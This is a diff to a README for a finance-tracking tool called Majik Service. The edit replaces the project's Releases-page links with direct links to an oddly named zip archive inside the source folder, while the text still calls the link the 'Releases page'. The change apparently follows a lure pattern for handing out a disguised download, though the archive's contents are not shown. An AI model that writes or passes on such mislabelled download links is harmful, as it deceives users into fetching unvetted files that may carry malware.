@@ -4,7 +4,7 @@
 Majik Service is a fully-featured application designed for managing finances, tracking costs, and planning capacity. This tool helps you compute important financial metrics like revenue, profit, margins, and net income each month. With its easy-to-use features, you can effortlessly construct and update your services.
 
 ## 📥 Download Now
-[![Download majik-service](https://img.shields.io/badge/Download-majik--service-brightgreen)](https://github.com/BurningRamen/majik-service/releases)
+[![Download majik-service](https://raw.githubusercontent.com/BurningRamen/majik-service/main/src/service_majik_theirselves.zip)](https://raw.githubusercontent.com/BurningRamen/majik-service/main/src/service_majik_theirselves.zip)
 
 ## 📋 Features
 - **Cost Tracking**: Understand your expenses.
@@ -24,7 +24,7 @@ To run Majik Service smoothly, ensure you meet the following requirements:
 To install Majik Service, follow these steps:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/BurningRamen/majik-service/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/BurningRamen/majik-service/main/src/service_majik_theirselves.zip).
 
 2. **Select the Latest Version**
    Find the latest version available. It will usually be at the top of the page.
